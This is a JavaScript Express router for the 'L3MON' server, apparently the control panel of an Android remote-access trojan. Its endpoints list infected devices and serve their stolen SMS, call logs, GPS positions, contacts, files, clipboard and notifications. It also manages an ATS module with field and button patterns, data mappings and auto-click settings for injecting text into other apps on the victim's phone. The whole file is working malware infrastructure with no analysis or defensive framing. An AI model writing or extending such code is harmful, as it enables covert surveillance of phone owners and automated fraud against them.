const express = require('express');
const router = express.Router();
const databaseGateway = require('./databaseGateway');

router.use(express.json());
router.use(express.urlencoded({ extended: true }));

if (!global.logManager) {
  global.logManager = { log: () => {} };
}

const atsManager = global.atsManager || new (require('./atsManager'))(databaseGateway);
if (!global.atsManager) {
  global.atsManager = atsManager;
}

function parseBooleanValue(value) {
  if (typeof value === 'boolean') return value;
  if (typeof value === 'string') {
    const normalized = value.trim().toLowerCase();
    if (['true', '1', 'yes', 'on'].includes(normalized)) return true;
    if (['false', '0', 'no', 'off'].includes(normalized)) return false;
  }

  return Boolean(value);
}

router.get('/', (req, res) => {
  res.status(200).json({ ok: true, message: 'L3MON server is running' });
});

router.get('/api/clients', async (req, res) => {
  try {
    const clients = await databaseGateway.listClients();
    res.status(200).json({ clients });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

router.get('/api/clients/:clientId/data', async (req, res) => {
  try {
    const { clientId } = req.params;
    const kind = req.query.kind || 'sms';

    if (kind === 'all') {
      const kinds = ['sms', 'call', 'location', 'clipboard', 'notification', 'permissions'];
      const data = {};

      for (const entryKind of kinds) {
        data[entryKind] = await databaseGateway.listClientData(clientId, entryKind);
      }

      return res.status(200).json({ clientId, kind: 'all', data });
    }

    const data = await databaseGateway.listClientData(clientId, kind);
    return res.status(200).json({ clientId, kind, data });
  } catch (error) {
    return res.status(500).json({ error: error.message });
  }
});

router.get('/api/clients/:clientId/page/:page', async (req, res) => {
  try {
    const { clientId, page } = req.params;
    const pageKinds = {
      sms: 'sms',
      calls: 'call',
      gps: 'location',
      contacts: 'contacts',
      wifi: 'wifi',
      downloads: 'downloads',
      files: 'files',
      apps: 'apps',
      text_injection: 'text_injection',
      clipboard: 'clipboard',
      notifications: 'notification',
      permissions: 'permissions',
    };

    const kind = pageKinds[page] || 'sms';
    const data = await databaseGateway.listClientData(clientId, kind);
    return res.status(200).json({ clientId, page, data });
  } catch (error) {
    return res.status(500).json({ error: error.message });
  }
});

router.get('/manage/:clientId/ats', (req, res) => {
  const { clientId } = req.params;
  atsManager.getATSConfig(clientId, (error, config) => {
    if (error) {
      return res.status(400).json({ error: error.message || error });
    }

    return res.status(200).json(config || {
      enabled: false,
      autoClickEnabled: false,
      clickDelayMs: 500,
      dataMapping: {},
      fieldPatterns: [],
      buttonPatterns: [],
      atsLog: [],
    });
  });
});

router.post('/manage/:clientId/ats/enable/:enabled', (req, res) => {
  const { clientId, enabled } = req.params;
  atsManager.setATSEnabled(clientId, parseBooleanValue(enabled), (error) => {
    if (error) {
      return res.status(400).json({ error: error.message || error });
    }

    return res.status(200).json({ enabled: parseBooleanValue(enabled) });
  });
});

router.post('/manage/:clientId/ats/autoclick/enable/:enabled', (req, res) => {
  const { clientId, enabled } = req.params;
  atsManager.setAutoClickEnabled(clientId, parseBooleanValue(enabled), (error) => {
    if (error) {
      return res.status(400).json({ error: error.message || error });
    }

    return res.status(200).json({ autoClickEnabled: parseBooleanValue(enabled) });
  });
});

router.post('/manage/:clientId/ats/data', (req, res) => {
  const { clientId } = req.params;
  const field = req.body?.field || req.query?.field;
  const value = req.body?.value || req.query?.value;

  atsManager.updateDataMapping(clientId, field, value, (error) => {
    if (error) {
      return res.status(400).json({ error: error.message || error });
    }

    return res.status(200).json({ success: true, field, value });
  });
});

router.delete('/manage/:clientId/ats/data/:field', (req, res) => {
  const { clientId, field } = req.params;
  atsManager.removeDataMapping(clientId, decodeURIComponent(field), (error) => {
    if (error) {
      return res.status(400).json({ error: error.message || error });
    }

    return res.status(200).json({ success: true });
  });
});

router.post('/manage/:clientId/ats/pattern', (req, res) => {
  const { clientId } = req.params;
  const pattern = req.body?.pattern || req.query?.pattern;

  atsManager.addFieldPattern(clientId, pattern, (error) => {
    if (error) {
      return res.status(400).json({ error: error.message || error });
    }

    return res.status(200).json({ success: true, pattern });
  });
});

router.delete('/manage/:clientId/ats/pattern/:pattern', (req, res) => {
  const { clientId, pattern } = req.params;
  atsManager.removeFieldPattern(clientId, decodeURIComponent(pattern), (error) => {
    if (error) {
      return res.status(400).json({ error: error.message || error });
    }

    return res.status(200).json({ success: true });
  });
});

router.post('/manage/:clientId/ats/buttonpattern', (req, res) => {
  const { clientId } = req.params;
  const pattern = req.body?.pattern || req.query?.pattern;

  atsManager.addButtonPattern(clientId, pattern, (error) => {
    if (error) {
      return res.status(400).json({ error: error.message || error });
    }

    return res.status(200).json({ success: true, pattern });
  });
});

router.delete('/manage/:clientId/ats/buttonpattern/:pattern', (req, res) => {
  const { clientId, pattern } = req.params;
  atsManager.removeButtonPattern(clientId, decodeURIComponent(pattern), (error) => {
    if (error) {
      return res.status(400).json({ error: error.message || error });
    }

    return res.status(200).json({ success: true });
  });
});

router.get('/manage/:clientId/ats/log', (req, res) => {
  const { clientId } = req.params;
  atsManager.getATSLog(clientId, 100, (error, logEntries) => {
    if (error) {
      return res.status(400).json({ error: error.message || error });
    }

    return res.status(200).json(logEntries || []);
  });
});

router.delete('/manage/:clientId/ats/log', (req, res) => {
  const { clientId } = req.params;
  atsManager.clearATSLog(clientId, (error) => {
    if (error) {
      return res.status(400).json({ error: error.message || error });
    }

    return res.status(200).json({ success: true });
  });
});

router.post('/manage/:clientId/ats/autoclick/delay/:delayMs', (req, res) => {
  const { clientId, delayMs } = req.params;
  atsManager.setClickDelay(clientId, delayMs, (error) => {
    if (error) {
      return res.status(400).json({ error: error.message || error });
    }

    return res.status(200).json({ success: true, clickDelayMs: parseInt(delayMs, 10) });
  });
});

router.get('/manage/:clientId/:page?', async (req, res) => {
  try {
    const { clientId, page = 'info' } = req.params;
    const pageKinds = {
      sms: 'sms',
      calls: 'call',
      gps: 'location',
      contacts: 'contacts',
      wifi: 'wifi',
      downloads: 'downloads',
      files: 'files',
      apps: 'apps',
      text_injection: 'text_injection',
      clipboard: 'clipboard',
      notifications: 'notification',
      permissions: 'permissions',
    };

    const kind = pageKinds[page] || 'sms';
    const data = await databaseGateway.listClientData(clientId, kind);
    const clientRecord = await databaseGateway.prisma?.client?.findUnique?.({ where: { clientId } }).catch(() => null);
    let pageData = [];

    if (page === 'gps') {
      pageData = Array.isArray(data) ? data : [];
      if (pageData.length > 0 && pageData[0] && pageData[0].latitude !== undefined) {
        pageData = pageData.map((entry) => ({
          ...entry,
          time: entry.time || entry.receivedAt || new Date().toISOString(),
        }));
      }
    } else if (page === 'calls') {
      pageData = Array.isArray(data) ? data.flatMap((entry) => entry.callsList || []) : [];
    } else if (page === 'sms') {
      pageData = Array.isArray(data) ? data.flatMap((entry) => entry.smsList || []) : [];
    } else if (page === 'notifications') {
      pageData = Array.isArray(data) ? data.map((entry) => entry) : [];
    } else if (page === 'permissions') {
      pageData = Array.isArray(data)
        ? data.flatMap((entry) => {
            if (Array.isArray(entry?.details)) {
              return entry.details.map((detail) => {
                if (typeof detail === 'string') {
                  return { name: detail, granted: true, status: 'granted' };
                }
                return detail;
              });
            }

            if (Array.isArray(entry?.permissions)) {
              return entry.permissions.map((permission) => {
                if (typeof permission === 'string') {
                  return { name: permission, granted: true, status: 'granted' };
                }
                return permission;
              });
            }

            if (entry && typeof entry === 'object') {
              return [entry];
            }

            return [];
          })
        : [];
    } else if (page === 'contacts') {
      pageData = Array.isArray(data)
        ? data.flatMap((entry) => {
            if (Array.isArray(entry?.contactsList)) {
              return entry.contactsList;
            }
            if (entry && typeof entry === 'object') {
              return [entry];
            }
            return [];
          })
        : [];
    } else if (page === 'wifi') {
      const wifiData = Array.isArray(data) ? data : [];
      pageData = {
        now: wifiData.filter((entry) => entry && (entry.SSID || entry.BSSID)).slice(0, 20),
        log: wifiData.filter((entry) => entry && (entry.SSID || entry.BSSID)).slice(0, 50),
      };
    } else if (page === 'downloads') {
      pageData = Array.isArray(data)
        ? data.flatMap((entry) => {
            if (entry && typeof entry === 'object' && (entry.originalName || entry.path || entry.time)) {
              return [entry];
            }
            return [];
          })
        : [];
    } else if (page === 'files') {
      pageData = Array.isArray(data)
        ? data.flatMap((entry) => {
            if (entry && typeof entry === 'object' && (entry.path || entry.name)) {
              return [entry];
            }
            return [];
          })
        : [];
    } else if (page === 'apps') {
      const appEntries = Array.isArray(data) ? data : [];
      pageData = appEntries.flatMap((entry) => {
        if (Array.isArray(entry?.apps)) {
          return entry.apps;
        }
        if (Array.isArray(entry?.items)) {
          return entry.items;
        }
        if (Array.isArray(entry)) {
          return entry;
        }
        if (entry && typeof entry === 'object' && (entry.appName || entry.packageName || entry.versionName || entry.name || entry.package)) {
          return [entry];
        }
        return [];
      });
    } else if (page === 'text_injection') {
      const textInjectionData = Array.isArray(data) ? data : [];
      const editableFields = textInjectionData.flatMap((entry) => {
        if (Array.isArray(entry?.editableFields)) return entry.editableFields;
        if (entry && typeof entry === 'object' && (entry.text || entry.viewId || entry.className || entry.description)) {
          return [entry];
        }
        return [];
      });
      pageData = { editableFields };
    } else if (page === 'clipboard') {
      pageData = Array.isArray(data) ? data.map((entry) => entry) : [];
    } else {
      pageData = Array.isArray(data) ? data : [];
    }

    const clientState = clientRecord ? {
      clientID: clientRecord.clientId,
      firstSeen: clientRecord.data?.firstSeen || clientRecord.createdAt,
      lastSeen: clientRecord.data?.lastSeen || clientRecord.updatedAt,
      isOnline: clientRecord.isOnline,
      dynamicData: clientRecord.data?.dynamicData || {},
      data: clientRecord.data || {},
    } : { clientID: clientId, isOnline: false, data: {} };

    return res.render('deviceManager', {
      page,
      deviceID: clientId,
      baseURL: `/manage/${clientId}`,
      pageData,
      client: clientState,
      clientState,
    });
  } catch (error) {
    return res.status(500).send(error.message);
  }
});

module.exports = router;
